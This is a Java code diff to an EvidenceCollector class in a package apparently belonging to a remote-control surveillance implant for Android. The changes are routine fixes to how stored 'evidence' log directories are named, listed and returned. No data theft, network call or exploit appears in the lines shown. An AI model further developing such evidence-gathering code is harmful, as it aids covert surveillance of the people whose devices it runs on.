@@ -2,6 +2,7 @@ package com.ht.RCSAndroidGUI;
 
 import java.io.File;
 import java.text.NumberFormat;
+import java.util.Collection;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.TreeMap;
@@ -172,7 +173,7 @@ public class EvidenceCollector {
         final Vector vector = new Vector();
         final String basePath = Path.logs();
 
-        final String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
+        final String blockDir = "l_" + (progressive / LOG_PER_DIRECTORY);
 
         // http://www.rgagnon.com/javadetails/java-0021.html
         final String mask = "0000";
@@ -312,11 +313,11 @@ public class EvidenceCollector {
                 String[] fileLogs = fc.list();
                       
                 for(String dir : fileLogs){
-                    File fdir=new File(dir);
+                    File fdir=new File(currentPath+dir);
                     if (fdir.isDirectory()) {
                         
           
-                    vector.addElement(dir);
+                    vector.addElement(dir+"/");
                     //#ifdef DEBUG
                     debug.trace("scanForDirLogs adding: " + dir);
                     //#endif
@@ -360,7 +361,7 @@ public class EvidenceCollector {
                 "currentPath shouldn't start with file:// : " + currentPath);
         //#endif
 
-        TreeMap map = new TreeMap();
+        TreeMap<String,String> map = new TreeMap<String,String>();
 
         File fcDir = null;
         // FileConnection fcFile = null;
@@ -402,9 +403,11 @@ public class EvidenceCollector {
 
         //#ifdef DEBUG
         debug.trace("scanForLogs numDirs: " + map.size());
-
         //#endif
-        return (String[]) map.values().toArray();
+         Collection<String> val = map.values();
+      
+        
+        return  map.values().toArray(new String[]{});
     }
 
     //
